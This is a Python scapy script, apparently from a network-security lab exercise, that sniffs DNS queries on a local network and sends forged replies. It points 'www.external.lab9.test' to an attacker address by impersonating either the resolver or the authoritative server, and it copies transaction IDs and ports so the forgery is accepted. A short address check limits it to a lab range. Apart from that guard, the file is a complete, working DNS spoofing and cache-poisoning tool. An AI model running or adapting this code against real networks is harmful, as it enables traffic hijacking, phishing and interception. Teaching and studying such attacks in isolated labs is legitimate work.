#!/usr/bin/env python3
from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send
import argparse, ipaddress, sys

VICTIM='10.9.0.100'
RESOLVER='10.9.0.10'
ATTACKER='10.9.0.200'
AUTH='172.16.6.20'
TARGET=b'www.external.lab9.test.'

def safe_ip(s):
    ip=ipaddress.ip_address(s)
    if ip not in ipaddress.ip_network('10.9.0.0/24') and ip != ipaddress.ip_address(AUTH):
        raise ValueError('LAB safety: address outside approved lab range')
    return ip
for x in [VICTIM,RESOLVER,ATTACKER,AUTH]: safe_ip(x)

def handler(pkt,mode):
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS) and pkt.haslayer(DNSQR)): return
    if pkt[DNS].qr != 0 or pkt[UDP].dport != 53: return
    qname=pkt[DNSQR].qname.lower()
    if qname != TARGET: return
    if mode=='victim':
        if pkt[IP].src != VICTIM or pkt[IP].dst != RESOLVER: return
        src,dst=RESOLVER,VICTIM
        dport=pkt[UDP].sport
        aa=0; ra=1
    else:
        if pkt[IP].src != RESOLVER or pkt[IP].dst != AUTH: return
        src,dst=AUTH,RESOLVER
        dport=pkt[UDP].sport
        aa=1; ra=0
    resp=(IP(src=src,dst=dst)/UDP(sport=53,dport=dport)/
          DNS(id=pkt[DNS].id,qr=1,aa=aa,rd=pkt[DNS].rd,ra=ra,qd=pkt[DNS].qd,
              an=DNSRR(rrname=TARGET,type='A',ttl=120,rdata=ATTACKER),ancount=1))
    send(resp,verbose=0)
    print(f'[LAB9] forged {mode} response: {TARGET.decode()} -> {ATTACKER}; txid={pkt[DNS].id}; dst={dst}:{dport}')

def main():
    ap=argparse.ArgumentParser(description='LAB9 same-LAN DNS spoof simulator - isolated network only')
    ap.add_argument('--mode',choices=['victim','resolver'],required=True)
    ap.add_argument('--iface',required=True,help='Kali DNS-LAB interface, e.g. eth1')
    args=ap.parse_args()
    print('LAB9 ONLY: listening for www.external.lab9.test on isolated DNS-LAB')
    print('mode=',args.mode,'iface=',args.iface)
    sniff(iface=args.iface,filter='udp port 53',prn=lambda p: handler(p,args.mode),store=0)

if __name__=='__main__': main()
